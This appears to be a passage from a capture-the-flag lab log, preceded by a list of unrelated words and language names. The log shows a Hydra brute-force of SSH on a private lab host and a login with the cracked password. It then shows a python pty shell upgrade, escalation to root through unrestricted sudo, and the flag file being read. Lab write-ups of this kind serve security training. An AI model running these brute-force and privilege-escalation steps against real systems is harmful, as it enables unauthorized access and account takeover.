+Guidance
+project
+decoration
+special
+Permanent
+connected
+repository
+Information
+Printable
+Bavarian
+Estonian
+Spanish
+Persian
+Indonesian
+Italian
+Georgian
+Hungarian
+Japanese
+Norwegian
+Portuguese
+Romanian
+Russian
+Finnish
+Swedish
+Ukrainian
+Chinese
+General
+root@kali:~/Desktop/knock# 
+root@kali:~/Desktop/knock# hydra -t 5 -V -f -l beavis -P custom_wordlist.txt 192.168.0.4 ssh
+Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2015-08-04 11:29:42
+[DATA] max 5 tasks per 1 server, overall 64 tasks, 1239 login tries (l:1/p:1239), ~3 tries per task
+[DATA] attacking service ssh on port 22
+[ATTEMPT] target 192.168.0.4 - login "beavis" - pass "wikipedia" - 1 of 1239 [child 0]
+[ATTEMPT] target 192.168.0.4 - login "beavis" - pass "headrft" - 2 of 1239 [child 1]
+[ATTEMPT] target 192.168.0.4 - login "beavis" - pass "2004rfr" - 3 of 1239 [child 2]
+[ATTEMPT] target 192.168.0.4 - login "beavis" - pass "beavis" - 4 of 1239 [child 3]
+[ATTEMPT] target 192.168.0.4 - login "beavis" - pass "mikejudge" - 5 of 1239 [child 4]
+[22][ssh] host: 192.168.0.4   login: beavis   password: mikejudge
+[STATUS] attack finished for 192.168.0.4 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2015-08-04 11:29:49
+
+root@kali:~# ssh beavis@192.168.0.4 /bin/bash
+############################################
+# CONGRATS! YOU HAVE OPENED THE SSH SERVER #
+# USERNAME: butthead                       #
+# PASSWORD: nachosrule                     #
+############################################
+beavis@192.168.0.4's password: 
+python -c 'import pty; pty.spawn("/bin/sh")'
+$ id
+id
+uid=1000(beavis) gid=1000(beavis) groups=1000(beavis),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),110(sambashare)
+$ sudo -l
+sudo -l
+[sudo] password for beavis: mikejudge
+
+Matching Defaults entries for beavis on Huhuhhhhhuhuhhh:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User beavis may run the following commands on Huhuhhhhhuhuhhh:
+    (ALL : ALL) ALL
+$ sudo bash
+sudo bash
+root@Huhuhhhhhuhuhhh:~# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@Huhuhhhhhuhuhhh:~# cd /root
+cd /root
+root@Huhuhhhhhuhuhhh:/root# ls
+ls
+SECRETZ
+root@Huhuhhhhhuhuhhh:/root# cat SECRETZ
+cat SECRETZ
+You have done a great job, if you can see this, please shoot me an email
+and let me know that you have beat this box!
+
+SECRET = "LIVE LONG AND PROSPER, REST IN PEACE MR. SPOCK"
+
+admin@top-hat-sec.com
+
+
+root@Huhuhhhhhuhuhhh:/root# 
